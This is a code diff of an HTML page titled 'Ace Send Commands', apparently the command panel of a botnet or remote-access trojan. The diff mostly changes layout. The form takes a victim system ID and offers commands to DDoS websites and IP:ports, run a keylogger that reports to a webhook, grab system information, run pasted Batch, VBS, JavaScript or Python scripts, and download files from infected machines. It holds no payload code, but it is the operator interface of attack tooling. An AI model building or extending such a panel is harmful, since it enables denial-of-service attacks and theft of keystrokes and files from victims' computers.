@@ -2,7 +2,6 @@
 <html>
 <head lang="en">
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <title>Ace Send Commands</title>
     <link rel="stylesheet" href="../static/css/site.css"/>
@@ -28,214 +27,216 @@
     <br>
 
     <!-- Enter Commands Input -->
-    <div class="containerr">
-        <form>
-            <!-- System ID Input -->
-            <div class="centerrr">
-                <div class="select-commands-group"> 
-                    <input type="text" name="idNumber" id="idNumber" required>
-                    <span class="highlight"></span>
-                    <span class="bar"></span>
-                    <label>System ID</label>
-                </div> 
-            </div>
-
-            <br>
-            <!-- Command Selection Box -->
-            <div class="centerrr-box">
-                <div class="select_mate" data-mate-select="active" >
-                    <select name="command-selection" id="command-selection" onchange="commandCheck(this);" onclick="return false;">
-                        <option value="" >Select Command </option>
-                        
-                        <!-- Options -->
-                        <option value="admincheck">Admin check</option>
-                        <option value="clear">Clear output</option>
-                        <option value="systeminfo">Grab system information</option>
-                        <option value="stress">Stress bot</option>
-                        <option value="ddos">DDos website</option>
-                        <option value="attack">DDos IP</option>
-                        <option value="keylogger">Keylogger</option>
-                        <option value="runscript">Run Script</option>
-                        <option value="download">Download File</option>
-                    </select>
-
-                    <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
-
-                    <span onclick="open_select(this)" class="icon_select_mate" >
-                            <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"/>
-                            <path d="M0-.75h24v24H0z" fill="none"/>
-                        </svg>
-                    </span>
-                    <div class="cont_list_select_mate">
-                        <ul class="cont_select_int">  </ul> 
-                    </div>
-                </div>
-            </div>
-
-            <!-- Command Inputs -->
-            <div class="centerrr-spec">
-                <!-- Stress -->
-                <div id="input-needed-stress" style="display: none;">
-                    <div class="commands-input-group"> 
-                        <input type="text" name="stress-time" id="stress-time" novalidate>
+    <div class="sizer">
+        <div class="containerr">
+            <form>
+                <!-- System ID Input -->
+                <div class="centerrr">
+                    <div class="select-commands-group"> 
+                        <input type="text" name="idNumber" id="idNumber" required>
                         <span class="highlight"></span>
                         <span class="bar"></span>
-                        <label>Stress Time</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="stress-tasks" id="stress-tasks" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Tasks</label>
+                        <label>System ID</label>
                     </div> 
                 </div>
 
-                <!-- DDos Website -->
-                <div id="input-needed-ddos" style="display: none;">
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-website-method" id="ddos-website-method" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Method</label>
-                    </div> 
+                <br>
+                <!-- Command Selection Box -->
+                <div class="centerrr-box">
+                    <div class="select_mate" data-mate-select="active" >
+                        <select name="command-selection" id="command-selection" onchange="commandCheck(this);" onclick="return false;">
+                            <option value="" >Select Command </option>
+                            
+                            <!-- Options -->
+                            <option value="admincheck">Admin check</option>
+                            <option value="clear">Clear output</option>
+                            <option value="systeminfo">Grab system information</option>
+                            <option value="stress">Stress bot</option>
+                            <option value="ddos">DDos website</option>
+                            <option value="attack">DDos IP</option>
+                            <option value="keylogger">Keylogger</option>
+                            <option value="runscript">Run Script</option>
+                            <option value="download">Download File</option>
+                        </select>
 
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-website-target" id="ddos-website-target" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Website</label>
-                    </div> 
+                        <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
 
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-website-time" id="ddos-website-time" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Attack Time</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-website-thread" id="ddos-website-thread" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Threads</label>
-                    </div> 
-                </div>
-
-                <!-- DDos IP:PORT -->
-                <div id="input-needed-ddos-ip" style="display: none;">
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-ip-method" id="ddos-ip-method" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Method</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-ip-target" id="ddos-ip-target" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>IP</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-ip-port" id="ddos-ip-port" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Port</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-ip-time" id="ddos-ip-time" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Attack Time</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="ddos-ip-thread" id="ddos-ip-thread" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Threads</label>
-                    </div> 
-                </div>
-
-                <!-- Keylogger -->
-                <div id="input-needed-keylogger" style="display: none;">
-                    <div class="commands-input-group"> 
-                        <input type="text" name="keylogger-intervals" id="keylogger-intervals" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Intervals</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="keylogger-reciever-email" id="keylogger-reciever-email" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Webhook</label>
-                    </div> 
-                </div>
-
-                <!-- Run Script -->
-                <div id="input-needed-runscript" style="display: none;">
-                    <div class="commands-input-group"> 
-                        <input type="text" name="runscript-name" id="runscript-name" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Script Name</label>
-                    </div> 
-
-                    <div class="commands-input-group"> 
-                        <input type="text" name="runscript-code" id="runscript-code" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Paste Source Here</label>
-                    </div> 
-
-                    <!-- Script Type Selection Box -->
-                    <div class="centerrr-box">
-                        <div class="select_mate" data-mate-select="active" >
-                            <select name="script-type-selection" id="script-type-selection" onchange="" onclick="return false;">
-                                <option value="" >Select Script Type </option>
-                                
-                                <!-- Options -->
-                                <option value="bat">Batch</option>
-                                <option value="js">JavaScript</option>
-                                <option value="vbs">VBS</option>
-                                <option value="py">Python</option>
-                            </select>
-
-                            <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
-
-                            <span onclick="open_select(this)" class="icon_select_mate" >
-                                    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"/>
-                                    <path d="M0-.75h24v24H0z" fill="none"/>
-                                </svg>
-                            </span>
-                            <div class="cont_list_select_mate">
-                                <ul class="cont_select_int">  </ul> 
-                            </div>
+                        <span onclick="open_select(this)" class="icon_select_mate" >
+                                <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"/>
+                                <path d="M0-.75h24v24H0z" fill="none"/>
+                            </svg>
+                        </span>
+                        <div class="cont_list_select_mate">
+                            <ul class="cont_select_int">  </ul> 
                         </div>
                     </div>
                 </div>
 
-                <!-- Download File -->
-                <div id="input-needed-download" style="display: none;">
-                    <div class="commands-input-group"> 
-                        <input type="text" name="download-path" id="download-path" novalidate>
-                        <span class="highlight"></span>
-                        <span class="bar"></span>
-                        <label>Path To File</label>
-                    </div> 
-                </div>
-            </div>
+                <!-- Command Inputs -->
+                <div class="centerrr-spec">
+                    <!-- Stress -->
+                    <div id="input-needed-stress" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="stress-time" id="stress-time" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Stress Time</label>
+                        </div> 
 
-        </form>
-        <br>
-        <div class="centerrr"><button type="submit" id="submit" onclick="check(this.form)" class="custom-btn btn-3"><span>Execute</span></button></div>
+                        <div class="commands-input-group"> 
+                            <input type="text" name="stress-tasks" id="stress-tasks" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Tasks</label>
+                        </div> 
+                    </div>
+
+                    <!-- DDos Website -->
+                    <div id="input-needed-ddos" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-website-method" id="ddos-website-method" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Method</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-website-target" id="ddos-website-target" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Website</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-website-time" id="ddos-website-time" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Attack Time</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-website-thread" id="ddos-website-thread" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Threads</label>
+                        </div> 
+                    </div>
+
+                    <!-- DDos IP:PORT -->
+                    <div id="input-needed-ddos-ip" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-ip-method" id="ddos-ip-method" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Method</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-ip-target" id="ddos-ip-target" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>IP</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-ip-port" id="ddos-ip-port" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Port</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-ip-time" id="ddos-ip-time" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Attack Time</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="ddos-ip-thread" id="ddos-ip-thread" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Threads</label>
+                        </div> 
+                    </div>
+
+                    <!-- Keylogger -->
+                    <div id="input-needed-keylogger" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="keylogger-intervals" id="keylogger-intervals" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Intervals</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="keylogger-reciever-email" id="keylogger-reciever-email" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Webhook</label>
+                        </div> 
+                    </div>
+
+                    <!-- Run Script -->
+                    <div id="input-needed-runscript" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="runscript-name" id="runscript-name" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Script Name</label>
+                        </div> 
+
+                        <div class="commands-input-group"> 
+                            <input type="text" name="runscript-code" id="runscript-code" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Paste Source Here</label>
+                        </div> 
+
+                        <!-- Script Type Selection Box -->
+                        <div class="centerrr-box">
+                            <div class="select_mate" data-mate-select="active" >
+                                <select name="script-type-selection" id="script-type-selection" onchange="" onclick="return false;">
+                                    <option value="" >Select Script Type </option>
+                                    
+                                    <!-- Options -->
+                                    <option value="bat">Batch</option>
+                                    <option value="js">JavaScript</option>
+                                    <option value="vbs">VBS</option>
+                                    <option value="py">Python</option>
+                                </select>
+
+                                <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
+
+                                <span onclick="open_select(this)" class="icon_select_mate" >
+                                        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M7.41 7.84L12 12.42l4.59-4.58L18 9.25l-6 6-6-6z"/>
+                                        <path d="M0-.75h24v24H0z" fill="none"/>
+                                    </svg>
+                                </span>
+                                <div class="cont_list_select_mate">
+                                    <ul class="cont_select_int">  </ul> 
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Download File -->
+                    <div id="input-needed-download" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="download-path" id="download-path" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Path To File</label>
+                        </div> 
+                    </div>
+                </div>
+
+            </form>
+            <br>
+            <div class="centerrr"><button type="submit" id="submit" onclick="check(this.form)" class="custom-btn btn-3"><span>Execute</span></button></div>
+        </div>
     </div>
     
     <br><br><br><br><br>
@@ -243,7 +244,7 @@
     <div class="center-shit">{{ commandStatus }}</div><br><br>
     
     <!-- Command Output Box -->
-    <div class="place-left" id="parent">
+    <div id="parent">
         <div class="center-output" class="child">
             <div class="gradient-border"> <textarea class='scroll' id="output" name="output" rows="30" cols="185" style="background-color:rgb(27, 27, 27);" readonly>{{ commandOutput }} </textarea> </div>
         </div>
